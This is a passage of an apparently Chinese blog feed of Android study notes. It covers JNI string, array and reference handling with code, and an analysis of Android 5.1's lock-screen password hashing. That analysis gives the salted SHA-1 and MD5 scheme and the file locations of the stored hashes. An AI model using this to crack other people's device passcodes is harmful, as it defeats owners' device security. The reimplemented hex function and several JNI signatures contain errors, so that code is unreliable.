&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;   jclass clazz_date = env-&amp;gt;FindClass(&amp;quot;java/util/Date&amp;quot;); //获取date对象
   jmethodID mid_date = env-&amp;gt;GetMethodID(clazz_date,&amp;quot;&amp;lt;init&amp;gt;&amp;quot;,&amp;quot;()V&amp;quot;); //获取构造方法的ID
   jobject now = env-&amp;gt;NewObject(clazz_date,mid_date); //生成Date对象
   jmethodID mid_date_getTime = env-&amp;gt;GetMethodID(clazz_date,&amp;quot;getTime()&amp;quot;,&amp;quot;()J&amp;quot;); //获取getTime的ID
   jlong time = env-&amp;gt;CallLongMethod(now,mid_date_getTime);//调用getTime返回时间
   printf(&amp;quot;%I64d&amp;quot;,time);
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;第二种：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用AllocObject函数创建一个对象，可以根据传入的jclass创建一个java对象，但是状态时未初始化的，在这个对象之前绝对要用CallNonvirtualVoidMethod来调用该jclass的构造函数这样可以延迟构造函数的调用。用的比较少。&lt;/p&gt;

&lt;p&gt;eg：略；&lt;/p&gt;

&lt;h5 id=&#34;2-4-2-native中操作java字符串&#34;&gt;2.4.2 native中操作Java字符串&lt;/h5&gt;

&lt;p&gt;​   Java-String对象是Unicode(UTF-16)码 一个字符总是占用两个字节 可以通过JNI接口将Java中的字符串转换到C++的宽字符串（wchar_t*),或者传回一个UTF-8编码的字符串（char * )到C++ 反过来同理。&lt;/p&gt;

&lt;p&gt;JNIEnv中的一些C++方法：&lt;/p&gt;

&lt;p&gt;1）获取字符串的长度：&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;jsize GetStringLength(jstring j_msg)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;1) 将jstring 对象拷贝到const jchar* 指针字符串：&lt;/p&gt;

&lt;p&gt;​   //拷贝Java字符串并以UTF-8编码传入jstr:&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;env-&amp;gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   ////拷贝Java字符串并以UTF-16编码传入jstr:&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;env-&amp;gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3) 生成一个jstring 对象&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;jobject NewString(const jchar* jstr,int size);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   将字符串指针jstr转换成jstring。&lt;/p&gt;

&lt;p&gt;4) 将jstring对象转换成const jchar* 字符串指。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;GetStringChars 开内存 指针指向先开的内存&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;const* jchar * GetStringChars(jstring j_msg,jboolean* copied)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;返回一个UTF-16编码的宽字符串（jchar*);&lt;/p&gt;

&lt;p&gt;对应的释放内存方法：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ReleaseStringChars(jstring j_msg,const jchar* jstr)&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;GetStringUTFChars 不开内存直接指向Java中string的指针&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;const char* GetStringUTFChars(jstring str,jboolean* copied)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;取得UTF-8编码的字符串&lt;/p&gt;

&lt;p&gt;释放：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;ReleaseStringUTFChars(jstring j_msg,const jchar* jstr)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;5) 将jstring 对象转化成const jchar* 字符串指针：&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​   作用:增加直接传回指向Java字符串的指针的可能性（而不是拷贝）；&lt;/p&gt;

&lt;p&gt;​   在&lt;code&gt;GetStringCritical/ReleaseStringCritical&lt;/code&gt;之间的关键区域之间不能调用任何其他JNI函数。否则会造成关键区域代码执行期间垃圾回收器停止工作。任何触发垃圾回收器的的线程也将暂停。&lt;/p&gt;

&lt;p&gt;​   释放：&lt;/p&gt;

&lt;p&gt;​   &lt;code&gt;ReleaseStringCritical(jstring j_msg,const jchar* jstr)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;实例eg：（与书上不同,思路大概相同）&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class MainActivity extends AppCompatActivity {
    private EditText et;
    private TextView tv;
    private Button bt;
    public String text = null;

    // Used to load the &#39;native-lib&#39; library on application startup.
    static {
        System.loadLibrary(&amp;quot;native-lib&amp;quot;);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        et = findViewById(R.id.editText);
        tv = findViewById(R.id.tv);
        bt = findViewById(R.id.button);
        bt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                text = et.getText().toString().trim();
                callCppFunction();
                tv.setText(text);
            }
        });

    }

    public native void callCppFunction();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;#include &amp;lt;jni.h&amp;gt;
#include &amp;lt;string&amp;gt;
#include&amp;lt;iostream&amp;gt;
#include&amp;lt;algorithm&amp;gt;
using namespace std;

extern &amp;quot;C&amp;quot;
JNIEXPORT void JNICALL
Java_com_example_naivete_jnidemo_MainActivity_callCppFunction(JNIEnv *env, jobject instance) {

    // TODO
    //获取text
    jfieldID  fid_tx = env-&amp;gt;GetFieldID(env-&amp;gt;GetObjectClass(instance),&amp;quot;text&amp;quot;,&amp;quot;Ljava/lang/String;&amp;quot;);
    //获取ext对象
    jstring j_tx = (jstring)env-&amp;gt;GetObjectField(instance,fid_tx);
    //第一种方式
    //获得字符串指针：
    const jchar* jstr1 = env-&amp;gt;GetStringChars(j_tx,NULL);
    //z转换成宽字符
    wstring wstr((const wchar_t*)jstr1);
    //释放指针
    env-&amp;gt;ReleaseStringChars(j_tx,jstr1);
    //第一种END

    //第二种
    const jchar * jstr2 = env-&amp;gt;GetStringCritical(j_tx,NULL);
    wstring wstr2((const wchar_t*)jstr2);
    env-&amp;gt;ReleaseStringCritical(j_tx,jstr2);
    //END

    //第三种
    jsize len = env-&amp;gt;GetStringLength(j_tx);  //获取长度
    jchar * jstr3 = new jchar[len+1];
    jstr3[len]=L&#39;\0&#39;;
    //复制
    env-&amp;gt;GetStringRegion(j_tx,0,len,jstr3);
    wstring wstr3((const wchar_t*)jstr3);
    delete[] jstr3;
    //End

    //倒序
    reverse(wstr.begin(),wstr.end());
    jstring j_new_str = env-&amp;gt;NewString((const jchar*)wstr.c_str(),(jint)wstr.size());
    env-&amp;gt;SetObjectField(instance,fid_tx,j_new_str);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-2-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;

&lt;h4 id=&#34;2-5-c-c-中操作java中的数组&#34;&gt;2.5 C/C++中操作Java中的数组&lt;/h4&gt;

&lt;p&gt;​   在java中数组分为两种：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;基本类型数组&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;对象类型数组&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一个能用于两种不同类型数组的函数是：GetArrayLength(jarray array)。&lt;/p&gt;

&lt;h5 id=&#34;2-5-1-操作基本类型的数组&#34;&gt;2.5.1 操作基本类型的数组&lt;/h5&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Get&lt;Type&gt;ArrayElements方法&lt;br /&gt;
&lt;code&gt;Get&amp;lt;Type&amp;gt;ArrayElements(&amp;lt;Type&amp;gt;Array arr,jboolean* isCopide)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;把Java中的基本类型的数组转换成C++中的数组 两种方式：&lt;/p&gt;

&lt;p&gt;一是拷贝一份传回本地，另外一种是把指向Java数组的指针直接传回到本地代码中&lt;/p&gt;

&lt;p&gt;处理完后，通过Release&lt;Type&gt;Arrayelements 来释放数组。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Release&lt;Type&gt;Arrayelement 方法&lt;br /&gt;
&lt;code&gt;Release&amp;lt;Type&amp;gt;Arrayelement(Type&amp;gt;Array arr,&amp;lt;Type&amp;gt;* array,jint mode)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个函数可以选择如何处理Java和C++中的数组，是提交还是撤销····内存是否释放等等。&lt;/p&gt;

&lt;p&gt;mode的取值：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;0：对Java的数组进行更新并且释放C/C++数组&lt;/li&gt;
&lt;li&gt;JNI_COMMIT：更新但是不释放&lt;/li&gt;
&lt;li&gt;JNI_ABOUT：不更新，释放。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;GetPrimittiveArrayCritical方法&lt;br /&gt;
&lt;code&gt;GetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ReleasePrimittiveArrayCritical方法&lt;br /&gt;
&lt;code&gt;ReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Get&lt;type&gt;ArrayRegion方法&lt;br /&gt;
&lt;code&gt;Get&amp;lt;type&amp;gt;ArrayRegion(&amp;lt;Type&amp;gt;Arryay arr,jsize strat ,jsize len,&amp;lt;Type&amp;gt;* buffer)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在C++中开辟内存，拷贝数组到内存中。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Set&lt;type&gt;ArrayRegion&lt;br /&gt;
&lt;code&gt;Set&amp;lt;type&amp;gt;ArrayRegion(&amp;lt;Type&amp;gt;Arryay arr,jsize strat ,jsize len,const &amp;lt;Type&amp;gt;* buffer)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;把Java基本类型数组中的指定范围的元素用C++数组中的元素来赋值。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;Type&gt;ArrayNew方法&lt;br /&gt;
&lt;code&gt;&amp;lt;Type&amp;gt;ArrayNew&amp;lt;Type&amp;gt;Array(jszie sz)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;指定一个长度然后返回相应的Java基本类型的数组。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&#34;2-5-2-操作对象数组类型&#34;&gt;2.5.2 操作对象数组类型&lt;/h5&gt;

&lt;p&gt;​   JNI未提供把Java对象数组 直接转到C++对象数组的函数。而是通过&lt;code&gt;Get/SetObjectArrayaElement&lt;/code&gt;这样的函数来对java中的对象数组进行操作。因为未拷贝 所以没有释放操作。&lt;code&gt;NewObjectArray&lt;/code&gt;可以通过指定长度和初始值来创建某一个类的数组。&lt;/p&gt;

&lt;p&gt;例子：两种类型的操作：&lt;/p&gt;

&lt;p&gt;略·····&lt;/p&gt;

&lt;p&gt;​   注：书本P34-36&lt;/p&gt;

&lt;h4 id=&#34;2-6-c-c中的引用类型和id缓存&#34;&gt;2.6 C++/C中的引用类型和ID缓存&lt;/h4&gt;

&lt;h5 id=&#34;2-6-1-引用类型&#34;&gt;2.6.1 引用类型&lt;/h5&gt;

&lt;p&gt;​   从Java创建对象传到本地C/C++代码时会产生引用，根据Java的垃圾回收机制，只要存在引用就不会触发改引用所指的Java对象垃圾回收。&lt;/p&gt;

&lt;p&gt;​   几种C/C++中的引用类型：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;局部引用：（最常见）&lt;/p&gt;

&lt;p&gt;局部引用只在该native函数中有用，所有在该函数中产生的局部引用，都会在函数返回时自动释放，也可以使用DeleteLocalRef函数手动释放。&lt;/p&gt;

&lt;p&gt;有效期中能传递到别的本地函数中，千万不要用C++全局变量保存它，或者把它定义为C++静态局部变量。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;全局引用：&lt;/p&gt;

&lt;p&gt;可以跨越当前线程，在对个native函数中有效，需要手动释放。会阻止垃圾回收器回收这个引用所指的对象。&lt;/p&gt;

&lt;p&gt;不同于局部引用，全局引用的创建不是由JNI自动创建的，全局引用是需要调用NewGlobalRef函数，释放使用ReleaseGlobalRef函数。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;弱全局引用&lt;/p&gt;

&lt;p&gt;与全局引用相似。不一样的为不会阻止垃圾回收器回收这个引用所指对象，使用NewWeakGlobalRef和ReleaseWeakGlobalRef来产生和释放。&lt;/p&gt;

&lt;p&gt;关于引用的一些函数：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jobject NewGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jobject NewLocalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jobject New WeakGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;void DeleteGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;void DeleteLocalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;void DeleteWeakGlobalRef(jobject obj)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;很容易理解上面6个函数&lt;/p&gt;

&lt;p&gt;&lt;code&gt;jboolean IsSameObject(jobject obj1,jobject obj2)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这个函数用来比较两个引用是否相等，但是对于弱引用有一个特别的功能，如果把NULL传入要比较的对象中就能判断弱全局引用所指的Java对象是否被回收。&lt;/p&gt;

&lt;p&gt;缓存jfieldID/jmethodID.减小查询开销。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&#34;2-6-2-缓存方法&#34;&gt;2.6.2 缓存方法&lt;/h5&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在用的时候缓存&lt;/p&gt;

&lt;p&gt;在native代码中使用static局部变量来保存已经查询过的id,就缓存下了id。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;在Java类初始化时缓存&lt;/p&gt;

&lt;p&gt;比较好的方法，在native调用前把所有ID全部保存下来。可以让Java代码在第一次加载这个类的时候首先调用本地代码初始化所有的jfildID/jmethodID.这样可以省去多次确定ID是否存在的语句。这些jfildID/jmethodID定义在C++的全局。当java类卸载或者重新加载的时候，也会重新计算ID.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class TestNative{
    static{
        initNativeIDs();  //静态代码块进行初始化
    }
    static native void initNativeIDs();
    int propInt = 0;
    String propStr = &amp;quot;&amp;quot;;
    public native void otherNative();
    ···········
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;//全局变量
jfieldID g_propInt_id = 0;
jfieldID g_propStr_id = 0;
    
JNIEXPORT void JNICALL Java_····init（JNIEnv* env,jobject clazz）{
    jfieldID g_propInt_id = GetfieldID(clazz,&amp;quot;propInt&amp;quot;,&amp;quot;I&amp;quot;);
    jfieldID g_propStr_id = GetfieldID(clazz,&amp;quot;propStr&amp;quot;,&amp;quot;/Ljava/lang/String;&amp;quot;);
}
JNIEXPORT void JNICALL Java_····other（JNIEnv* env,jobject clazz）{
    ············
}
    
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;​   主要是NDK开发相关。&lt;/p&gt;

&lt;p&gt;​   感觉系统的学了一遍还是感觉不错的。&lt;/p&gt;

&lt;p&gt;​   可以多找网上的例子来练习练习，加深对JNI 的了解。&lt;/p&gt;

&lt;p&gt;​&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android安全和开发环境搭建</title>
      <link>https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Thu, 05 Jul 2018 17:35:46 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%AE%89%E5%85%A8%E5%92%8C%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      
        <description>

&lt;h1 id=&#34;android安全和开发环境搭建&#34;&gt;Android安全和开发环境搭建&lt;/h1&gt;

&lt;blockquote&gt;
&lt;p&gt;补充中·····&lt;/p&gt;

&lt;h4 id=&#34;java环境&#34;&gt;JAVA环境&lt;/h4&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;JDK下载与安装。&lt;/li&gt;
&lt;li&gt;环境变量配置&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;android-studio&#34;&gt;Android Studio&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;官网下载（扶墙）&lt;/li&gt;
&lt;li&gt;SDK&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;ndk-jni-开发&#34;&gt;NDK（JNI）开发&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;NDK下载&lt;/li&gt;
&lt;li&gt;使用&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;eclipse-还是推荐上面的as&#34;&gt;Eclipse (还是推荐上面的AS)&lt;/h4&gt;

&lt;p&gt;不喜欢界面，弃用。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析 基础篇①</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/</link>
      <pubDate>Mon, 02 Jul 2018 17:33:05 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/</guid>
      
        <description>

&lt;h2 id=&#34;第一章-android中锁屏密码加密算法分析&#34;&gt;第一章 Android中锁屏密码加密算法分析&lt;/h2&gt;

&lt;h4 id=&#34;1-锁屏密码方式&#34;&gt;1. 锁屏密码方式：&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;手势&lt;/li&gt;
&lt;li&gt;九宫格连线&lt;/li&gt;
&lt;li&gt;输入密码&lt;/li&gt;
&lt;li&gt;指纹、人脸、虹膜&lt;/li&gt;
&lt;li&gt;可穿戴设备&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;2-这儿分析手势密码和输入密码&#34;&gt;2. 这儿分析手势密码和输入密码&lt;/h4&gt;

&lt;p&gt;找到android源代码中的LockPatternUtils,java 这个工具类&lt;br /&gt;
   路径：Android-5.1.1\frameworks\base\core\java\com\android\internal\widget&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;2.1 输入密码算法分析    (5.1版本的源代码 和书上细微差异)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0
           if (password == null) {
               return null;
           }
   
           try {
               byte[] saltedPassword = (password + getSalt(userId)).getBytes();  
               byte[] sha1 = MessageDigest.getInstance(&amp;quot;SHA-1&amp;quot;).digest(saltedPassword);
               byte[] md5 = MessageDigest.getInstance(&amp;quot;MD5&amp;quot;).digest(saltedPassword);
   //首先让 password+salt值 再SHA-1和MD5
               byte[] combined = new byte[sha1.length + md5.length];
               System.arraycopy(sha1, 0, combined, 0, sha1.length);
               System.arraycopy(md5, 0, combined, sha1.length, md5.length);
   //装换成hex值 再拼接起来
               final char[] hexEncoded = HexEncoding.encode(combined);
               return new String(hexEncoded).getBytes(StandardCharsets.UTF_8);
           } catch (NoSuchAlgorithmException e) {
               throw new AssertionError(&amp;quot;Missing digest algorithm: &amp;quot;, e);
           }
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如何获取设备对应的salt值：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;       private String getSalt(int userId) {
           long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId);
           if (salt == 0) {   //值为0  重新生成
               try {
                   salt = SecureRandom.getInstance(&amp;quot;SHA1PRNG&amp;quot;).nextLong();
                   setLong(LOCK_PASSWORD_SALT_KEY, salt, userId);  //保存值
                   Log.v(TAG, &amp;quot;Initialized lock password salt for user: &amp;quot; + userId);
               } catch (NoSuchAlgorithmException e) {
                   throw new IllegalStateException(&amp;quot;Couldn&#39;t get SecureRandom number&amp;quot;, e);
               }
           }
           return Long.toHexString(salt);       //  hex之后返回
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;继续跟踪 看保存的地方&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   private long getLong(String secureSettingKey, long defaultValue, int userHandle) {
           try {
               return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle);
           } catch (RemoteException re) {
               return defaultValue;
           }
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;继续跟踪代码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   @VisibleForTesting
       public ILockSettings getLockSettings() {
           if (mLockSettingsService == null) {
               ILockSettings service = ILockSettings.Stub.asInterface(
                       ServiceManager.getService(&amp;quot;lock_settings&amp;quot;));   //获取服务来操作
               mLockSettingsService = service;
           }
           return mLockSettingsService;
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中&lt;/p&gt;

&lt;p&gt;这里在LockSettingService.java中  找到这个类的getLong方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public long getLong(String key, long defaultValue, int userId) {
           checkReadPermission(key, userId);
           String value = getStringUnchecked(key, null, userId);
           return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value);
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;保存在数据库？&lt;/p&gt;

&lt;p&gt;继续跟踪&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   static class Injector {
   
           protected Context mContext;
   
           public Injector(Context context) {
               mContext = context;
           }
   
           public Context getContext() {
               return mContext;
           }
   
           public Handler getHandler() {
               return new Handler();
           }
   
           public LockSettingsStorage getStorage() {
               final LockSettingsStorage storage = new LockSettingsStorage(mContext);
               storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() {
                   @Override
                   public void initialize(SQLiteDatabase db) {
                       // Get the lockscreen default from a system property, if available
                       boolean lockScreenDisable = SystemProperties.getBoolean(
                               &amp;quot;ro.lockscreen.disable.default&amp;quot;, false);
                       if (lockScreenDisable) {
                           storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, &amp;quot;1&amp;quot;, 0);
                       }
                   }
               });
               return storage;
           }
   
   public LockSettingsService(Context context) {
           this(new Injector(context));
       }
   
   
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;继续  查看LockSettingsStorage.java 类中   存在数据库中&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   static class DatabaseHelper extends SQLiteOpenHelper {
           private static final String TAG = &amp;quot;LockSettingsDB&amp;quot;;
           private static final String DATABASE_NAME = &amp;quot;locksettings.db&amp;quot;;
   
           private static final int DATABASE_VERSION = 2;
           private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000;
   
           private Callback mCallback;
   
           public DatabaseHelper(Context context) {
               super(context, DATABASE_NAME, null, DATABASE_VERSION);
               setWriteAheadLoggingEnabled(true);
               // Memory optimization - close idle connections after 30s of inactivity
               setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS);
           }
   
           public void setCallback(Callback callback) {
               mCallback = callback;
           }
   
           private void createTable(SQLiteDatabase db) {
               db.execSQL(&amp;quot;CREATE TABLE &amp;quot; + TABLE + &amp;quot; (&amp;quot; +
                       &amp;quot;_id INTEGER PRIMARY KEY AUTOINCREMENT,&amp;quot; +
                       COLUMN_KEY + &amp;quot; TEXT,&amp;quot; +
                       COLUMN_USERID + &amp;quot; INTEGER,&amp;quot; +
                       COLUMN_VALUE + &amp;quot; TEXT&amp;quot; +
                       &amp;quot;);&amp;quot;);
           }
   
           @Override
           public void onCreate(SQLiteDatabase db) {
               createTable(db);
               if (mCallback != null) {
                   mCallback.initialize(db);
               }
           }
   
           @Override
           public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) {
               int upgradeVersion = oldVersion;
               if (upgradeVersion == 1) {
                   // Previously migrated lock screen widget settings. Now defunct.
                   upgradeVersion = 2;
               }
   
               if (upgradeVersion != DATABASE_VERSION) {
                   Log.w(TAG, &amp;quot;Failed to upgrade database!&amp;quot;);
               }
           }
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到了数据库的名字叫作：locksettings.db  保存在了：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;       private static final String SYSTEM_DIRECTORY = &amp;quot;/system/&amp;quot;;    //目录
       private static final String LOCK_PATTERN_FILE = &amp;quot;gatekeeper.pattern.key&amp;quot;;   
       private static final String BASE_ZERO_LOCK_PATTERN_FILE = &amp;quot;gatekeeper.gesture.key&amp;quot;;
       private static final String LEGACY_LOCK_PATTERN_FILE = &amp;quot;gesture.key&amp;quot;;    //key1
       private static final String LOCK_PASSWORD_FILE = &amp;quot;gatekeeper.password.key&amp;quot;;
       private static final String LEGACY_LOCK_PASSWORD_FILE = &amp;quot;password.key&amp;quot;;    //key2
       private static final String CHILD_PROFILE_LOCK_FILE = &amp;quot;gatekeeper.profile.key&amp;quot;;
       private static final String SYNTHETIC_PASSWORD_DIRECTORY = &amp;quot;spblob/&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库文件存在/data/system/locksetting.db&lt;/p&gt;

&lt;p&gt;测试  在/data/system/下看到password.key&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-1-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;打开看看：&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-1-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;手动简单实现加密算法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public byte[] passwordToHash(String password) {
           if (password == null) {
               return null;
           }
           byte [] hashed = null;
           try {
               byte[] saltedPassword = (password + SALT).getBytes();    //SALT 值从数据库中得到 拿到之后进行hex转换
               byte[] sha1 = MessageDigest.getInstance(&amp;quot;SHA-1&amp;quot;).digest(saltedPassword);
               byte[] md5 = MessageDigest.getInstance(&amp;quot;MD5&amp;quot;).digest(saltedPassword);
               hashed = (toHex(sha1)+toHex(md5)).getBytes();
           } catch(Exception e){
               
           }
           return hashed;
       }
       private static String toHex(byte[] ary){
           final String hex = &amp;quot;102031398sjdfklaj&amp;quot;;
           String ret = &amp;quot;&amp;quot;;
           for(int i=0;i&amp;lt;ary.length;i++){
               ret += hex.charAt((ary[i]&amp;gt;&amp;gt; 4)&amp;amp; 0xf);
               ret += hex.charAt(ary[i]&amp;amp; 0xf);
           }
           return ret;
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SALT 的值可以从数据库中拿到 也可以利用反射获取&lt;/p&gt;

&lt;p&gt;总结：&lt;/p&gt;

&lt;p&gt;​    MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;2.2 手势密码分析&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;大致同上&lt;/p&gt;

&lt;h4 id=&#34;3-简要&#34;&gt;3. 简要：&lt;/h4&gt;

&lt;p&gt;​    九宫格团装化成字节数组-&amp;gt;sha1 加密  即可&lt;/p&gt;

&lt;p&gt;​     其实大致流程和分析输入密码差不多   保存到本地的目录、/data/system/gesture.key 文件&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Daily</title>
      <link>https://naivete.cc/daily/</link>
      <pubDate>Mon, 02 Oct 2017 21:49:20 +0200</pubDate>
      
      <guid>https://naivete.cc/daily/</guid>
      
        <description>

&lt;h2 id=&#34;daily-summary&#34;&gt;Daily summary&lt;/h2&gt;

&lt;p&gt;中断了很长一段时间、重新开始写。也算是一个新的开始吧。也换了一个Blog环境。&lt;/p&gt;

&lt;h3 id=&#34;2019&#34;&gt;2019&lt;/h3&gt;

&lt;h4 id=&#34;05-09&#34;&gt;05-09&lt;/h4&gt;

